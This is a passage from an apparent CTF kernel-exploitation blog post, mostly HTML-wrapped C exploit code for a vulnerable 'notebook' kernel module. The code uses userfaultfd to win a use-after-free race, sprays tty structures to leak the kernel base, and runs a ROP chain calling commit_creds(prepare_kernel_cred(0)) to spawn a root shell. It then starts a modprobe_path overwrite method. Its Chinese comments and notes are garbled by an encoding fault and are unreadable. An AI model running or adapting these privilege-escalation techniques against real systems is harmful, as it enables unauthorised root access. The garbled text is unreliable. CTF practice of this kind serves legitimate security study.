/tmp/moduleaddr | awk &#x27;&#123;print $6&#125;&#x27;&quot;</span>, <span class=\"string\">&quot;r&quot;</span>);</span><br><span class=\"line\">\tassert(stream != <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">\tfread(buf, <span class=\"number\">0x10</span> + <span class=\"number\">2</span>, <span class=\"number\">1</span> ,stream);</span><br><span class=\"line\">\tmod_base_addr = strtoul(buf, <span class=\"literal\">NULL</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;moduleaddr is %lx&quot;</span>, mod_base_addr);</span><br><span class=\"line\"></span><br><span class=\"line\">\tfault_page = mmap(<span class=\"literal\">NULL</span>, <span class=\"number\">0x1000</span>, PROT_READ|PROT_WRITE, </span><br><span class=\"line\">\t\t\t\t\t\tMAP_PRIVATE | MAP_ANONYMOUS, <span class=\"number\">-1</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">\tfault_page_len = <span class=\"number\">0x1000</span>;</span><br><span class=\"line\">\tuffd_register();</span><br><span class=\"line\"></span><br><span class=\"line\">\tadd(<span class=\"number\">0</span> ,<span class=\"number\">0x60</span> ,zero);</span><br><span class=\"line\">\tedit(<span class=\"number\">0</span> ,<span class=\"number\">0x3ff</span> ,zero);<span class=\"comment\">// é‡æ–°ç”³è¯·ä¸€ä¸ª0x400çš„å—</span></span><br><span class=\"line\">\tedit(<span class=\"number\">0</span> ,<span class=\"number\">0x400</span> ,fault_page);<span class=\"comment\">// è¿”å›ä¸Šä¸€ä¸ªåŸå—çš„åœ°å€ å†™å®Œsizeå°±å¡ä½</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tgetchar();</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">0x30</span>; i++)&#123;</span><br><span class=\"line\">\t\tInfo(<span class=\"string\">&quot;ptmx_fds[%d] is %d&quot;</span>, i, ptmx_fds[i]);</span><br><span class=\"line\">\t\tptmx_fds[i] = open(<span class=\"string\">&quot;/dev/ptmx&quot;</span>, O_RDWR|O_NOCTTY);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tread_from_kernel(<span class=\"number\">0</span>, fake_tty_struct);</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;fake_tty_struct&#x27;s addr is 0x%lx&quot;</span>, fake_tty_struct);</span><br><span class=\"line\">\t<span class=\"comment\">// æ­¤æ—¶gdbçœ‹å†…å­˜ å¯ä»¥çœ‹åˆ°ç›¸å…³æ³„æ¼çš„åœ°å€</span></span><br><span class=\"line\">\tkernel_base_addr = fake_tty_struct[<span class=\"number\">3</span>] - <span class=\"number\">0xe8e440</span>;</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;kernel base addr is 0x%lx&quot;</span>, kernel_base_addr);</span><br><span class=\"line\">\taddKernelBase();</span><br><span class=\"line\">\tadd(<span class=\"number\">1</span>, <span class=\"number\">0x60</span>, zero);</span><br><span class=\"line\">\tedit(<span class=\"number\">1</span>, <span class=\"number\">0x100</span>, zero);<span class=\"comment\">// ROP</span></span><br><span class=\"line\">\tadd(<span class=\"number\">2</span>, <span class=\"number\">0x60</span>, zero);<span class=\"comment\">// tty ops </span></span><br><span class=\"line\"></span><br><span class=\"line\">\tgift(ntbk);</span><br><span class=\"line\">\tu64 tty_ops_addr = ntbk[<span class=\"number\">2</span>].buf;</span><br><span class=\"line\">\tu64 rop_addr = ntbk[<span class=\"number\">1</span>].buf;</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;rop&#x27;s addr is 0x%lx&quot;</span>, rop_addr);</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;tty_ops_addr&#x27;s addr is 0x%lx&quot;</span>, tty_ops_addr);</span><br><span class=\"line\"></span><br><span class=\"line\">\tfake_tty_struct[<span class=\"number\">3</span>] \t\t= tty_ops_addr;</span><br><span class=\"line\">\t<span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">\t\t0xffffffff8100354f                  sub    rsp, 0xffffffffffffff80</span></span><br><span class=\"line\"><span class=\"comment\">\t\t0xffffffff81003553                  pop    rbx</span></span><br><span class=\"line\"><span class=\"comment\">\t\t0xffffffff81003554                  pop    rbp</span></span><br><span class=\"line\"><span class=\"comment\">\t\t0xffffffff81003555                  ret </span></span><br><span class=\"line\"><span class=\"comment\">\t*/</span></span><br><span class=\"line\">\tfake_tty_struct[<span class=\"number\">1</span>] \t\t= a[SUB_RSP_RET];<span class=\"comment\">// rsp + 0x80 + pop * 2 = 18 * 8</span></span><br><span class=\"line\">\tfake_tty_struct[<span class=\"number\">0x14</span>]\t= a[POP_RSP];<span class=\"comment\">// 1 + 18 + 1 = 0x14</span></span><br><span class=\"line\">\tfake_tty_struct[<span class=\"number\">0x15</span>]\t= rop_addr;<span class=\"comment\">// ç¬¬äºŒæ¬¡æ ˆè¿ç§»</span></span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;write_to_kernel(0, fake_tty_struct);&quot;</span>);</span><br><span class=\"line\">\twrite_to_kernel(<span class=\"number\">0</span>, fake_tty_struct);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// write operation , rdi is tty_struct&#x27;s addr</span></span><br><span class=\"line\">\t<span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">\t\t0xffffffff8143f4e1                  push   rdi</span></span><br><span class=\"line\"><span class=\"comment\">\t\t0xffffffff8143f4e2                  pop    rsp</span></span><br><span class=\"line\"><span class=\"comment\">\t\t0xffffffff8143f4e3                  pop    rbp</span></span><br><span class=\"line\"><span class=\"comment\">\t\t0xffffffff8143f4e4                  or     eax, edx</span></span><br><span class=\"line\"><span class=\"comment\">\t\t0xffffffff8143f4e6                  ret </span></span><br><span class=\"line\"><span class=\"comment\">\t*/</span></span><br><span class=\"line\">\tfake_tty_ops[<span class=\"number\">7</span>] = a[PUSH_RDI_POP_RSP_POP_RET];</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">int</span> i = <span class=\"number\">0</span>;</span><br><span class=\"line\">\tu64 ROP[<span class=\"number\">0x20</span>];<span class=\"comment\">// è¿™ä¸ªROPæ˜¯è¦å†™å…¥å†…æ ¸çš„ ä¸éœ€è¦å»æ‰“CR4å…³smep</span></span><br><span class=\"line\">\tROP[i++] = a[POP_RDI];</span><br><span class=\"line\">\tROP[i++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">\tROP[i++] = a[PREPARE_KERNEL_CRED];<span class=\"comment\">// rax = prepare_kernel_cred(0)</span></span><br><span class=\"line\">\tROP[i++] = a[MOV_RDI_RAX_POP_RET];<span class=\"comment\">// rdi = rax</span></span><br><span class=\"line\">\tROP[i++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">\tROP[i++] = a[COMMIT_CREDS];<span class=\"comment\">// commit_creds(rdi) get root</span></span><br><span class=\"line\">\tROP[i++] = a[SWAPGS_POP_RET];</span><br><span class=\"line\">\tROP[i++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">\tROP[i++] = a[IRETQ];</span><br><span class=\"line\">\tROP[i++] = (u64)getshell;</span><br><span class=\"line\">\tROP[i++] = user_cs;</span><br><span class=\"line\">\tROP[i++] = user_flags;</span><br><span class=\"line\">\tROP[i++] = user_sp;</span><br><span class=\"line\">\tROP[i++] = user_ss;</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;write_to_kernel(1, ROP)&quot;</span>);</span><br><span class=\"line\">\twrite_to_kernel(<span class=\"number\">1</span>, ROP);</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;write_to_kernel(2, fake_tty_ops)&quot;</span>);</span><br><span class=\"line\">\twrite_to_kernel(<span class=\"number\">2</span>, fake_tty_ops);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">char</span> tmp[] = <span class=\"string\">&quot;squsqusqusqu&quot;</span>;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;Spray write ptmx start&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">0x30</span>; i++)&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">// Dbg(&quot;fd is [%d]&quot;, ptmx_fds[i]);</span></span><br><span class=\"line\">\t\twrite(ptmx_fds[i], tmp, <span class=\"number\">0x10</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tDone(<span class=\"string\">&quot;exploit&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">uffd_register</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">uffdio_api</span> <span class=\"title\">ua</span>;</span><span class=\"comment\">// io operation api</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">uffdio_register</span> <span class=\"title\">ur</span>;</span><span class=\"comment\">// io register</span></span><br><span class=\"line\">    <span class=\"comment\">// find /usr/include -name unistd_64.h 2&gt;/dev/null</span></span><br><span class=\"line\">    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class=\"line\">\tDbg(<span class=\"string\">&quot;uffd: %d&quot;</span>, uffd);</span><br><span class=\"line\"></span><br><span class=\"line\">\tua.api = UFFD_API;</span><br><span class=\"line\">\tua.features = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(ioctl(uffd, UFFDIO_API, &amp;ua) == <span class=\"number\">-1</span>) </span><br><span class=\"line\">\t\terrExit(<span class=\"string\">&quot;ioctl(uffd,UFFDIO_API,ua)&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\tur.range.start = (<span class=\"type\">long</span> <span class=\"type\">long</span> <span class=\"type\">unsigned</span> <span class=\"type\">int</span>)fault_page;</span><br><span class=\"line\">\tur.range.len   = fault_page_len;</span><br><span class=\"line\">\tur.mode \t   = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class=\"number\">-1</span>)</span><br><span class=\"line\">\t\terrExit(<span class=\"string\">&quot;ioctl(uffd,UFFDIO_REGISTER,&amp;ur)&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">pthread_t</span> thr;</span><br><span class=\"line\">\t<span class=\"comment\">// æ³¨æ„è¿™é‡Œæ²¡æœ‰-1 pthread createæ­£å¸¸è¿”å›0</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(pthread_create(&amp;thr, <span class=\"literal\">NULL</span>, UFFD_handler ,<span class=\"literal\">NULL</span>))</span><br><span class=\"line\">\t\terrExit(<span class=\"string\">&quot;pthread_create&quot;</span>);</span><br><span class=\"line\">\tDone(<span class=\"string\">&quot;regitser&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> *<span class=\"title function_\">UFFD_handler</span><span class=\"params\">(<span class=\"type\">void</span> *nil)</span>&#123;</span><br><span class=\"line\">\tDbg(<span class=\"string\">&quot;UFFD handler start&quot;</span>);</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">uffd_msg</span> <span class=\"title\">msg</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (<span class=\"number\">1</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">pollfd</span> <span class=\"title\">pollfd</span>;</span></span><br><span class=\"line\">\t\t<span class=\"type\">int</span> nready = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\tpollfd.fd\t\t= uffd;</span><br><span class=\"line\">\t\tpollfd.events\t= POLLIN ;</span><br><span class=\"line\">\t\tnready = poll(&amp;pollfd, <span class=\"number\">1</span>, <span class=\"number\">-1</span>);<span class=\"comment\">// block here</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(nready != <span class=\"number\">1</span>)</span><br><span class=\"line\">\t\t\terrExit(<span class=\"string\">&quot;poll&quot;</span>);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t&#123;<span class=\"comment\">// user code modify area</span></span><br><span class=\"line\">\t\t\tedit(<span class=\"number\">0</span>, <span class=\"number\">0x500</span>, zero);<span class=\"comment\">// ç¬¬ä¸€ä¸ªedit freeæ‰vuln chunk</span></span><br><span class=\"line\">\t\t\tedit(<span class=\"number\">0</span>, <span class=\"number\">0x400</span>, zero);<span class=\"comment\">// ç¬¬äºŒä¸ªedit ç¡®ä¿sizeä¸å˜</span></span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(read(uffd, &amp;msg, <span class=\"keyword\">sizeof</span>(msg)) != <span class=\"keyword\">sizeof</span>(msg))</span><br><span class=\"line\">\t\t\terrExit(<span class=\"string\">&quot;read&quot;</span>);</span><br><span class=\"line\">\t\tassert(msg.event == UFFD_EVENT_PAGEFAULT);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">uffdio_copy</span> <span class=\"title\">uc</span>;</span></span><br><span class=\"line\">\t\tuc.src \t= (<span class=\"type\">unsigned</span> <span class=\"type\">long</span>)zero;</span><br><span class=\"line\">\t\tuc.dst \t= (<span class=\"type\">unsigned</span> <span class=\"type\">long</span>)fault_page;</span><br><span class=\"line\">\t\tuc.len \t= fault_page_len;</span><br><span class=\"line\">\t\tuc.mode = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\tioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class=\"line\">\t\tDone(<span class=\"string\">&quot;ioctl done&quot;</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2022/09/11/kernel-notebook-three-solutions/2.png\" alt=\"Pasted image 20220910222000\"></p>\n<h2 id=\"modprobe\"><a class=\"markdownIt-Anchor\" href=\"#modprobe\">#</a> modprobe</h2>\n<p>ç¯¡æ”¹ modprobe æ‰§è¡Œç‰¹æƒæŒ‡ä»¤</p>\n<p>write æ²¡åŠ é” è½»è€Œæ˜“ä¸¾é…åˆ uffd å†™ uaf</p>\n<p>ä¸€ä¸ªæ˜¯æ³¨æ„æ³„æ¼ cookie</p>\n<p>å¦å¤–ä¸€ä¸ªå°±æ˜¯é“¾è¡¨ç»“å°¾çš„å¼‚æˆ–è¡¨è¾¾å¼ ï¼ˆç»™ name ç»™ä½ å†™å°±æ˜¯æ–¹ä¾¿ä¼ªé€ è¿™ä¸ªçš„ï¼‰</p>\n<ul>\n<li>é€šè¿‡ gift æ³„æ¼å¾—åˆ°ç»“æ„ä½“ <code>notebook</code>  çš„åœ°å€ä¿¡æ¯ ç”±äºæ˜¯ c ç¨‹åºè¿›è¡Œäº¤äº’ï¼Œæ‰€ä»¥æœ‰äº† notebook åœ°å€ä¿¡æ¯ å°±èƒ½é€šè¿‡æŒ‡é’ˆä»»æ„è¯»å–å†…éƒ¨çš„å…¶ä»–ä¿¡æ¯äº† æ¯”å¦‚ cookie</li>\n<li>åˆ©ç”¨ setxattr å’Œ uffd è¿›è¡Œä»»æ„ uaf åŠ«æŒ ç¯¡æ”¹ notebook é€šè¿‡ ko ä¸­çš„ call é‡å®šå‘æ³„æ¼å†…æ ¸åŸºå€</li>\n<li>å¦å¤–ä¸€ä¸ªæŒ‡é’ˆåŠ«æŒåˆ° <code>notebook</code>  çš„åœ°å€ è¿™æ ·å°±èƒ½ç»§ç»­ç¯¡æ”¹ è®©å…¶æŒ‡å‘ <code>modprobe_path</code></li>\n</ul>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;pthread.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/ioctl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/types.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/stat.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/mman.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;errno.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;signal.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/syscall.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdint.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/prctl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;poll.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;assert.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;include/head.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> PAGE_SIZE 1024</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">uffd_register</span><span class=\"params\">()</span>;</span><br><span class=\"line\"><span class=\"type\">void</span> *<span class=\"title function_\">UFFD_handler</span><span class=\"params\">(<span class=\"type\">void</span> *nil)</span>;</span><br><span class=\"line\"><span class=\"type\">int</span> uffd, note_fd;</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> mod_base_addr, cookie ,kernel_base_addr;</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> fault_page, fault_page_len;</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> target, modprobe_path;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> errExit(msg) do&#123;perror(msg);exit(1);&#125;while(0)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span>&#123;</span></span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> idx;</span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> size;</span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> buf;</span><br><span class=\"line\">&#125;userarg;</span><br><span class=\"line\"><span class=\"type\">void</span> _add(<span class=\"type\">size_t</span> idx, <span class=\"type\">size_t</span> size, <span class=\"type\">void</span> *buf)&#123;</span><br><span class=\"line\">\tuserarg arg;</span><br><span class=\"line\">\targ.idx = (<span class=\"type\">uint64_t</span>)idx;</span><br><span class=\"line\">\targ.size = (<span class=\"type\">uint64_t</span>)size;</span><br><span class=\"line\">\targ.buf = (<span class=\"type\">uint64_t</span>)buf;</span><br><span class=\"line\">\tioctl(note_fd, <span class=\"number\">0x100</span> ,&amp;arg);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> _del(<span class=\"type\">size_t</span> idx)&#123;</span><br><span class=\"line\">\tuserarg arg;</span><br><span class=\"line\">\targ.idx = (<span class=\"type\">uint64_t</span>)idx;</span><br><span class=\"line\">\tioctl(note_fd, <span class=\"number\">0x200</span> ,&amp;arg);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> _edit(<span class=\"type\">size_t</span> idx, <span class=\"type\">size_t</span> newsize, <span class=\"type\">char</span> *buf)&#123;</span><br><span class=\"line\">\tuserarg arg;</span><br><span class=\"line\">\targ.idx = (<span class=\"type\">uint64_t</span>)idx;</span><br><span class=\"line\">\targ.size = (<span class=\"type\">uint64_t</span>)newsize;</span><br><span class=\"line\">\targ.buf = (<span class=\"type\">uint64_t</span>)buf;</span><br><span class=\"line\">\tioctl(note_fd, <span class=\"number\">0x300</span>, &amp;arg);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> _gift(<span class=\"type\">char</span> *buf)&#123;</span><br><span class=\"line\">\tuserarg arg;</span><br><span class=\"line\">\targ.buf = (<span class=\"type\">uint64_t</span>)buf;</span><br><span class=\"line\">\tioctl(note_fd, <span class=\"number\">100</span>, &amp;arg);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">write_to_kernel</span><span class=\"params\">(<span class=\"type\">size_t</span> idx, <span class=\"type\">char</span> *user_buf)</span>&#123;</span><br><span class=\"line\">\twrite(note_fd, user_buf, idx);<span class=\"comment\">// é€†å‘ mynote_readå¯ä»¥å¾—åˆ°</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">read_from_kernel</span><span class=\"params\">(<span class=\"type\">size_t</span> idx, <span class=\"type\">char</span> *user_buf)</span>&#123;</span><br><span class=\"line\">\tread(note_fd, user_buf, idx);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">char</span> *buf;</span><br><span class=\"line\"><span 